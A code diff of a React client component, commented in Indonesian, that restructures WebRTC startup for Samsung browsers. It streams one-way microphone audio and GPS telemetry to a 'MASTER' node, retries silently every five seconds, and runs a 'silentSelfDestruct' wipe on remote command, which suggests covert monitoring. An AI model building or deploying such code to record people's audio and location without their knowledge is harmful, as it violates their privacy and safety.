@@ -409,41 +409,18 @@ export const Client: React.FC<ClientProps> = ({
 
   /**
    * ============================================================================
-   * 5. FUNGSI UTAMA `startWebRTC()` (100% AUTO-CONNECT & AUTO-OFFER KE MASTER)
+   * 5. FUNGSI UTAMA INISIALISASI CLIENT (SAMSUNG GALAXY A26 5G STRICT LIFECYCLE)
    * ============================================================================
-   * Dipanggil otomatis saat WebSocket `onopen` aktif, saat menerima sinyal `master_online`,
-   * atau oleh timer Auto-Reconnect setiap 5 detik apabila belum terhubung ke Master.
+   * Urutan Eksekusi Strict untuk Kompatibilitas Mesin Browser Samsung:
+   *   a. Tunggu `await navigator.mediaDevices.getUserMedia(...)` sukses DULU.
+   *   b. Simpan stream mikrofon tersebut (`rawStreamRef.current`).
+   *   c. BARU buat `new RTCPeerConnection(RTC_CONFIG)` + pasang audio dengan
+   *      `peerConnection.addTransceiver(track, { direction: 'sendonly' })`.
+   *   d. BARU buat `new WebSocket(...)` (atau kirim Offer jika WS sudah terbuka).
    */
-  const startWebRTC = useCallback(async () => {
-    const ws = wsRef.current;
-    if (!ws || ws.readyState !== WebSocket.OPEN) return;
-
-    // Cek apakah PeerConnection sudah terhubung DAN sudah memiliki track audio aktif yang terkirim
-    const existingPc = nativePcRef.current;
-    const hasAudioSenderTrack = Boolean(
-      existingPc &&
-        existingPc
-          .getSenders()
-          .some((s) => s.track && s.track.kind === 'audio' && s.track.readyState === 'live')
-    );
-
-    if (
-      existingPc &&
-      hasAudioSenderTrack &&
-      (existingPc.connectionState === 'connected' ||
-        existingPc.iceConnectionState === 'connected' ||
-        existingPc.iceConnectionState === 'completed')
-    ) {
-      isConnectedRef.current = true;
-      setPeerStatus('CONNECTED');
-      return;
-    }
-
-    if (isHandshakingRef.current) return;
-    isHandshakingRef.current = true;
-
-    try {
-      // Bersihkan instans RTCPeerConnection lama jika gagal/terputus atau belum memiliki audio track
+  const createSamsungSafePeerConnection = useCallback(
+    (stream: MediaStream | null): RTCPeerConnection => {
+      // Bersihkan instans RTCPeerConnection lama jika ada
       if (nativePcRef.current) {
         try {
           nativePcRef.current.onicecandidate = null;
@@ -453,20 +430,41 @@ export const Client: React.FC<ClientProps> = ({
         } catch {}
       }
 
+      // 1c. BARU buat new RTCPeerConnection(...) SETELAH getUserMedia selesai
       const peerConnection = new RTCPeerConnection(RTC_CONFIG);
       nativePcRef.current = peerConnection;
       pendingCandidatesRef.current = [];
       isRemoteDescReadyRef.current = false;
 
-      // Buat RTCDataChannel untuk pengiriman koordinat GPS & penerimaan komando Master
-      const dc = peerConnection.createDataChannel('sigma-telemetry', { ordered: true });
+      // 2. GUNAKAN ADD-TRANSCEIVER (BUKAN ADD-TRACK) UNTUK HARDWARE SAMSUNG:
+      if (stream && stream.getAudioTracks().length > 0) {
+        stream.getAudioTracks().forEach((track) => {
+          track.enabled = !remoteAudioStateRef.current.muted;
+          peerConnection.addTransceiver(track, {
+            direction: 'sendonly',
+            streams: [stream],
+          });
+        });
+      } else {
+        // Fallback transceiver apabila perangkat sedang tidak memiliki audio track
+        peerConnection.addTransceiver('audio', {
+          direction: 'sendonly',
+        });
+      }
+
+      // Buat RTCDataChannel untuk pengiriman koordinat GPS & komando Master
+      const dc = peerConnection.createDataChannel('sigma-telemetry', {
+        ordered: true,
+      });
       nativeDcRef.current = dc;
 
       dc.onopen = () => {
         isConnectedRef.current = true;
         setPeerStatus('CONNECTED');
         if (passivePipelineRef.current) {
-          passivePipelineRef.current.bindDataChannel(dc as unknown as DataChannelLike);
+          passivePipelineRef.current.bindDataChannel(
+            dc as unknown as DataChannelLike
+          );
         }
         transmitTelemetryPacket();
       };
@@ -490,54 +488,30 @@ export const Client: React.FC<ClientProps> = ({
         } catch {}
       };
 
-      // Ambil stream mikrofon (dengan fallback { audio: true } untuk Samsung)
-      // dan tambahkan ke PeerConnection SEBELUM memanggil createOffer()
-      const stream = (await ensureMicrophoneStream()) || rawStreamRef.current;
-      let addedAudioTrack = false;
-      if (stream && stream.getTracks().length > 0) {
-        stream.getTracks().forEach((track) => {
-          track.enabled = !remoteAudioStateRef.current.muted;
-          peerConnection.addTrack(track, stream);
-          if (track.kind === 'audio') {
-            addedAudioTrack = true;
+      // 3. PENANGANAN ICE GATHERING "NULL" (SAMSUNG QUIRK):
+      // Browser Samsung sering mengirim `event.candidate === null` secara tiba-tiba
+      // untuk menandai ICE gathering selesai. WAJIB gunakan penjagaan `if (event.candidate)`
+      // agar tidak error/crash saat membaca data kosong!
+      peerConnection.onicecandidate = (event: RTCPeerConnectionIceEvent) => {
+        if (event.candidate) {
+          const ws = wsRef.current;
+          if (ws && ws.readyState === WebSocket.OPEN) {
+            const candidatePacket = {
+              type: 'candidate',
+              senderId: nodeId,
+              targetId: 'MASTER',
+              data: event.candidate.toJSON(),
+            };
+            console.log(
+              `[CLIENT-WS] Mengirim ICE Candidate dari senderId="${nodeId}" -> targetId="MASTER"`
+            );
+            ws.send(JSON.stringify(candidatePacket));
           }
-        });
-      }
-
-      // Jika mikrofon belum aktif/tersedia, tetap pastikan ada jalur m-line audio
-      if (!addedAudioTrack) {
-        peerConnection.addTransceiver('audio', {
-          direction: 'sendonly',
-        });
-      }
-
-      // Pastikan seluruh transceiver audio berarah 'sendonly' agar SDP konsisten di Samsung
-      peerConnection.getTransceivers().forEach((tr) => {
-        if (
-          tr.sender.track?.kind === 'audio' ||
-          tr.receiver.track?.kind === 'audio'
-        ) {
-          try {
-            tr.direction = 'sendonly';
-          } catch {}
-        }
-      });
-
-      // Kirim ICE Candidate otomatis dengan format:
-      // { type: "candidate", senderId: myClientId, targetId: "MASTER", data: candidate }
-      peerConnection.onicecandidate = (event) => {
-        if (event.candidate && ws.readyState === WebSocket.OPEN) {
-          const candJson = event.candidate.toJSON();
-          const candidatePacket = {
-            type: 'candidate',
-            senderId: nodeId,
-            targetId: 'MASTER',
-            data: candJson,
-          };
+        } else {
+          // event.candidate === null menandakan ICE gathering selesai di browser Samsung
           console.log(
-            `[CLIENT-WS] Mengirim ICE Candidate dari senderId="${nodeId}" -> targetId="MASTER"`
+            `[CLIENT-WS] ICE Gathering selesai pada perangkat (${nodeId}) [event.candidate === null]`
           );
-          ws.send(JSON.stringify(candidatePacket));
         }
       };
 
@@ -573,25 +547,83 @@ export const Client: React.FC<ClientProps> = ({
       peerConnection.onconnectionstatechange = checkConnectionState;
       peerConnection.oniceconnectionstatechange = checkConnectionState;
 
-      // Buat SDP Offer SETELAH addTransceiver('audio', { direction: 'sendonly' }) & addTrack selesai
-      const offer = await peerConnection.createOffer();
-      await peerConnection.setLocalDescription(offer);
+      return peerConnection;
+    },
+    [nodeId, transmitTelemetryPacket]
+  );
 
-      if (ws.readyState === WebSocket.OPEN && peerConnection.localDescription) {
-        const offerData = {
-          type: peerConnection.localDescription.type,
-          sdp: peerConnection.localDescription.sdp,
-        };
-        const offerPacket = {
-          type: 'offer',
-          senderId: nodeId,
-          targetId: 'MASTER',
-          data: offerData,
-        };
-        console.log(
-          `[CLIENT-WS] Mengirim OFFER dari senderId="${nodeId}" -> targetId="MASTER"`
-        );
-        ws.send(JSON.stringify(offerPacket));
+  // Fungsi pengiriman SDP Offer setelah PeerConnection dan WebSocket sama-sama siap
+  const sendOfferOverWebSocket = useCallback(
+    async (peerConnection: RTCPeerConnection, ws: WebSocket) => {
+      if (ws.readyState !== WebSocket.OPEN) return;
+      try {
+        const offer = await peerConnection.createOffer();
+        await peerConnection.setLocalDescription(offer);
+
+        if (ws.readyState === WebSocket.OPEN && peerConnection.localDescription) {
+          const offerPacket = {
+            type: 'offer',
+            senderId: nodeId,
+            targetId: 'MASTER',
+            data: {
+              type: peerConnection.localDescription.type,
+              sdp: peerConnection.localDescription.sdp,
+            },
+          };
+          console.log(
+            `[CLIENT-WS] Mengirim OFFER dari senderId="${nodeId}" -> targetId="MASTER"`
+          );
+          ws.send(JSON.stringify(offerPacket));
+        }
+      } catch (err) {
+        console.error('[CLIENT-WS] Gagal membuat/mengirim Offer:', err);
+      }
+    },
+    [nodeId]
+  );
+
+  // Fungsi Re-Handshake (digunakan saat menerima sinyal `master_online` atau retry 5 detik)
+  // Tetap mematuhi urutan: 1. Await Media -> 2. Simpan Stream -> 3. Buat PC + addTransceiver -> 4. Kirim via WS
+  const startWebRTC = useCallback(async () => {
+    const existingPc = nativePcRef.current;
+    const hasAudioSenderTrack = Boolean(
+      existingPc &&
+        existingPc
+          .getSenders()
+          .some(
+            (s) =>
+              s.track &&
+              s.track.kind === 'audio' &&
+              s.track.readyState === 'live'
+          )
+    );
+
+    if (
+      existingPc &&
+      hasAudioSenderTrack &&
+      (existingPc.connectionState === 'connected' ||
+        existingPc.iceConnectionState === 'connected' ||
+        existingPc.iceConnectionState === 'completed')
+    ) {
+      isConnectedRef.current = true;
+      setPeerStatus('CONNECTED');
+      return;
+    }
+
+    if (isHandshakingRef.current) return;
+    isHandshakingRef.current = true;
+
+    try {
+      // a & b. Tunggu getUserMedia sukses DULU dan simpan stream tersebut
+      const stream = (await ensureMicrophoneStream()) || rawStreamRef.current;
+
+      // c. BARU buat new RTCPeerConnection(...) dan pasang addTransceiver('sendonly')
+      const pc = createSamsungSafePeerConnection(stream);
+
+      // d. Kirim Offer melalui WebSocket jika sudah OPEN
+      const ws = wsRef.current;
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        await sendOfferOverWebSocket(pc, ws);
       }
     } catch (err) {
       console.error('[CLIENT-WS] Error di dalam startWebRTC():', err);
@@ -600,19 +632,26 @@ export const Client: React.FC<ClientProps> = ({
         isHandshakingRef.current = false;
       }, 1200);
     }
-  }, [ensureMicrophoneStream, nodeId, transmitTelemetryPacket]);
+  }, [
+    createSamsungSafePeerConnection,
+    ensureMicrophoneStream,
+    sendOfferOverWebSocket,
+  ]);
 
   /**
    * ============================================================================
-   * 6. WEBSOCKET AUTO-CONNECT & 5-SECOND SILENT AUTO-RECONNECT LOOP
+   * 6. SAMSUNG STRICT LIFECYCLE BOOTSTRAP (AWAIT MEDIA -> PC -> WEBSOCKET)
    * ============================================================================
-   * Saat aplikasi Klien dimuat (`useEffect`), langsung terhubung ke WebSocket,
-   * mengirim `{ type: "register", id: myClientId }`, memanggil `startWebRTC()`,
-   * dan menjalankan interval 5 detik untuk retry otomatis apabila Master belum online.
+   * Urutan eksekusi wajib saat komponen Client dimuat:
+   *   a. Tunggu `await navigator.mediaDevices.getUserMedia(...)` sukses DULU.
+   *   b. Simpan stream tersebut di `rawStreamRef.current`.
+   *   c. BARU buat `new RTCPeerConnection(RTC_CONFIG)` + `addTransceiver(track, { direction: 'sendonly' })`.
+   *   d. BARU buat `new WebSocket(...)`.
    */
   useEffect(() => {
     let isMounted = true;
     let wsReconnectTimer: number | null = null;
+    let autoOfferInterval: number | null = null;
 
     const connectSignalingWebSocket = () => {
       if (!isMounted) return;
@@ -626,25 +665,39 @@ export const Client: React.FC<ClientProps> = ({
 
       try {
         const wsUrl = getSignalingWebSocketUrl();
-        console.log(`[CLIENT-WS] Menghubungkan ke WebSocket: ${wsUrl} (id="${nodeId}")`);
+        console.log(
+          `[CLIENT-WS] Langkah 1d: Membuat koneksi WebSocket ke ${wsUrl} (id="${nodeId}")`
+        );
         const ws = new WebSocket(wsUrl);
         wsRef.current = ws;
 
-        ws.onopen = () => {
+        ws.onopen = async () => {
           if (!isMounted) return;
-          setPeerStatus((prev) => (prev === 'CONNECTED' ? 'CONNECTED' : 'AUTO_DISCOVERY'));
+          setPeerStatus((prev) =>
+            prev === 'CONNECTED' ? 'CONNECTED' : 'AUTO_DISCOVERY'
+          );
 
-          // ATURAN 1: Begitu WebSocket onopen, Client WAJIB mengirim:
-          // { type: "register", id: myClientId }
+          // Registrasi ID unik Klien ke Signaling Server
           const registerPacket = {
             type: 'register',
             id: nodeId,
           };
-          console.log('[CLIENT-WS] WebSocket terbuka. Mengirim registrasi:', registerPacket);
+          console.log(
+            '[CLIENT-WS] WebSocket terbuka. Mengirim registrasi:',
+            registerPacket
+          );
           ws.send(JSON.stringify(registerPacket));
 
-          // Begitu WebSocket onopen aktif, otomatis jalankan startWebRTC()
-          startWebRTC();
+          // Gunakan RTCPeerConnection yang sudah disiapkan pada Langkah 1c
+          // (atau buat baru jika belum ada / sudah tertutup)
+          let pc = nativePcRef.current;
+          if (!pc || pc.signalingState === 'closed') {
+            const stream =
+              rawStreamRef.current || (await ensureMicrophoneStream());
+            pc = createSamsungSafePeerConnection(stream);
+          }
+
+          await sendOfferOverWebSocket(pc, ws);
         };
 
         ws.onmessage = async (event) => {
@@ -664,12 +717,11 @@ export const Client: React.FC<ClientProps> = ({
             }", targetId: "${data.targetId || ''}"`
           );
 
-          // Pastikan pesan ini memang ditujukan ke Klien ini (jika ada targetId)
           if (data.targetId && data.targetId !== nodeId) {
             return;
           }
 
-          // Jika Master baru saja online dan Klien ini BELUM terkoneksi, langsung kirim Offer
+          // Jika Master baru saja online dan Klien ini BELUM terkoneksi, langsung negosiasi ulang
           if (data.type === 'master_online') {
             const pc = nativePcRef.current;
             const alreadyActive =
@@ -678,7 +730,9 @@ export const Client: React.FC<ClientProps> = ({
                 pc.iceConnectionState === 'connected' ||
                 pc.iceConnectionState === 'completed');
             if (!alreadyActive) {
-              console.log('[CLIENT-WS] MASTER online terdeteksi! Memulai ulang startWebRTC()...');
+              console.log(
+                '[CLIENT-WS] MASTER online terdeteksi! Memulai ulang startWebRTC()...'
+              );
               isConnectedRef.current = false;
               isHandshakingRef.current = false;
               startWebRTC();
@@ -686,8 +740,7 @@ export const Client: React.FC<ClientProps> = ({
             return;
           }
 
-          // Terima SDP Answer dari Master:
-          // { type: "answer", senderId: "MASTER", targetId: myClientId, data: answer }
+          // Terima SDP Answer dari Master
           const sdpPayload = (data.data || data.sdp) as
             | RTCSessionDescriptionInit
             | undefined;
@@ -705,21 +758,16 @@ export const Client: React.FC<ClientProps> = ({
                 await pc.setRemoteDescription(
                   new RTCSessionDescription(sdpPayload)
                 );
-                // Tandai bahwa setRemoteDescription() telah selesai (resolved promise)
                 isRemoteDescReadyRef.current = true;
                 isConnectedRef.current = true;
                 setPeerStatus('CONNECTED');
                 console.log('[CLIENT-WS] setRemoteDescription(answer) BERHASIL!');
 
-                // Setelah setRemoteDescription() selesai dieksekusi, masukkan semua candidate
-                // yang sempat tertahan di antrean (candidateQueue / pendingCandidatesRef)
+                // Masukkan semua ICE Candidate yang sempat mengantre
                 const candidateQueue = pendingCandidatesRef.current;
                 while (candidateQueue.length > 0) {
                   const cand = candidateQueue.shift();
                   if (cand) {
-                    console.log(
-                      '[CLIENT-WS] Memasukkan ICE Candidate dari antrean (candidateQueue)'
-                    );
                     await pc
                       .addIceCandidate(new RTCIceCandidate(cand))
                       .catch((err) => {
@@ -733,14 +781,15 @@ export const Client: React.FC<ClientProps> = ({
                 transmitTelemetryPacket();
               }
             } catch (err) {
-              console.error('[CLIENT-WS] Gagal setRemoteDescription(answer):', err);
+              console.error(
+                '[CLIENT-WS] Gagal setRemoteDescription(answer):',
+                err
+              );
             }
             return;
           }
 
-          // 1. ICE CANDIDATE QUEUEING (PENCEGAH RACE CONDITION):
-          // Saat menerima pesan { type: "candidate" } dari WebSocket, JANGAN langsung memanggil
-          // peerConnection.addIceCandidate() sebelum remoteDescription siap.
+          // Terima ICE Candidate dari Master (dengan antrean pencegah Race Condition)
           const candidatePayload = (data.data || data.candidate) as
             | RTCIceCandidateInit
             | undefined;
@@ -756,12 +805,10 @@ export const Client: React.FC<ClientProps> = ({
                 pc.remoteDescription.type &&
                 isRemoteDescReadyRef.current
               ) {
-                console.log('[CLIENT-WS] Menambahkan ICE Candidate langsung dari MASTER');
-                await pc.addIceCandidate(new RTCIceCandidate(candidatePayload));
-              } else {
-                console.log(
-                  '[CLIENT-WS] Mengantrekan ICE Candidate dari MASTER ke candidateQueue (remoteDescription belum siap)'
+                await pc.addIceCandidate(
+                  new RTCIceCandidate(candidatePayload)
                 );
+              } else {
                 pendingCandidatesRef.current.push(candidatePayload);
               }
             } catch (err) {
@@ -770,7 +817,7 @@ export const Client: React.FC<ClientProps> = ({
             return;
           }
 
-          // Komando Jarak Jauh dari Master via WebSocket fallback
+          // Komando Jarak Jauh dari Master
           if (data.type === 'EMERGENCY_WIPE') {
             silentSelfDestruct({
               streams: [rawStreamRef.current, outboundStreamRef.current],
@@ -793,11 +840,16 @@ export const Client: React.FC<ClientProps> = ({
 
         ws.onclose = () => {
           if (!isMounted) return;
-          console.warn('[CLIENT-WS] Koneksi WebSocket terputus. Mencoba reconnect dalam 2.5 detik...');
+          console.warn(
+            '[CLIENT-WS] Koneksi WebSocket terputus. Mencoba reconnect dalam 2.5 detik...'
+          );
           if (!isConnectedRef.current) {
             setPeerStatus('AUTO_DISCOVERY');
           }
-          wsReconnectTimer = window.setTimeout(connectSignalingWebSocket, 2500);
+          wsReconnectTimer = window.setTimeout(
+            connectSignalingWebSocket,
+            2500
+          );
         };
 
         ws.onerror = (err) => {
@@ -811,41 +863,62 @@ export const Client: React.FC<ClientProps> = ({
       }
     };
 
-    // Segera koneksikan WebSocket tanpa tertahan dialog izin mikrofon,
-    // sekaligus aktifkan mikrofon secara paralel.
-    connectSignalingWebSocket();
-    ensureMicrophoneStream().catch(() => {});
-
-    // Interval 5 detik (5000ms) untuk Auto-Reconnect & Re-Offer secara senyap sampai berhasil terhubung
-    const autoOfferInterval = window.setInterval(() => {
+    // =========================================================================
+    // EKSEKUSI BERURUTAN (STRICT SEQUENTIAL STARTUP UNTUK SAMSUNG):
+    //   a. Tunggu `await navigator.mediaDevices.getUserMedia(...)` sukses DULU.
+    //   b. Simpan stream tersebut (`rawStreamRef.current`).
+    //   c. BARU buat `new RTCPeerConnection(...)` + `addTransceiver('sendonly')`.
+    //   d. BARU buat `new WebSocket(...)`.
+    // =========================================================================
+    const initializeSamsungSequentialFlow = async () => {
+      console.log(
+        '[CLIENT-BOOT] Langkah 1a & 1b: Menunggu getUserMedia(...) selesai dan menyimpan stream...'
+      );
+      const stream = await ensureMicrophoneStream();
       if (!isMounted) return;
 
-      // Pastikan WebSocket selalu tersambung
-      if (!wsRef.current || wsRef.current.readyState === WebSocket.CLOSED) {
-        connectSignalingWebSocket();
-        return;
-      }
-
-      const pc = nativePcRef.current;
-      const isPcConnected = Boolean(
-        pc &&
-          (pc.connectionState === 'connected' ||
-            pc.iceConnectionState === 'connected' ||
-            pc.iceConnectionState === 'completed')
+      console.log(
+        '[CLIENT-BOOT] Langkah 1c: Membuat new RTCPeerConnection(...) & addTransceiver(track, { direction: "sendonly" })...'
       );
+      createSamsungSafePeerConnection(stream);
 
-      if (!isPcConnected && mediaCallsRef.current.size === 0) {
-        console.log(
-          `[CLIENT-WS] Auto-Retry 5s: Klien "${nodeId}" belum terhubung ke MASTER, mengirim ulang Offer...`
+      console.log(
+        '[CLIENT-BOOT] Langkah 1d: Membuka koneksi new WebSocket(...)...'
+      );
+      connectSignalingWebSocket();
+
+      // Interval 5 detik untuk Auto-Reconnect & Re-Offer secara senyap apabila Master belum online
+      autoOfferInterval = window.setInterval(() => {
+        if (!isMounted) return;
+
+        if (!wsRef.current || wsRef.current.readyState === WebSocket.CLOSED) {
+          connectSignalingWebSocket();
+          return;
+        }
+
+        const pc = nativePcRef.current;
+        const isPcConnected = Boolean(
+          pc &&
+            (pc.connectionState === 'connected' ||
+              pc.iceConnectionState === 'connected' ||
+              pc.iceConnectionState === 'completed')
         );
-        isHandshakingRef.current = false;
-        startWebRTC();
-      }
-    }, 5000);
+
+        if (!isPcConnected && mediaCallsRef.current.size === 0) {
+          console.log(
+            `[CLIENT-WS] Auto-Retry 5s: Klien "${nodeId}" belum terhubung ke MASTER, mengirim ulang Offer...`
+          );
+          isHandshakingRef.current = false;
+          startWebRTC();
+        }
+      }, 5000);
+    };
+
+    initializeSamsungSequentialFlow();
 
     return () => {
       isMounted = false;
-      clearInterval(autoOfferInterval);
+      if (autoOfferInterval) clearInterval(autoOfferInterval);
       if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
       if (wsRef.current) {
         try {
@@ -858,7 +931,14 @@ export const Client: React.FC<ClientProps> = ({
         } catch {}
       }
     };
-  }, [ensureMicrophoneStream, nodeId, startWebRTC, transmitTelemetryPacket]);
+  }, [
+    createSamsungSafePeerConnection,
+    ensureMicrophoneStream,
+    nodeId,
+    sendOfferOverWebSocket,
+    startWebRTC,
+    transmitTelemetryPacket,
+  ]);
 
   // 7. Real Hardware Geolocation + 10-Second Telemetry Loop
   useEffect(() => {
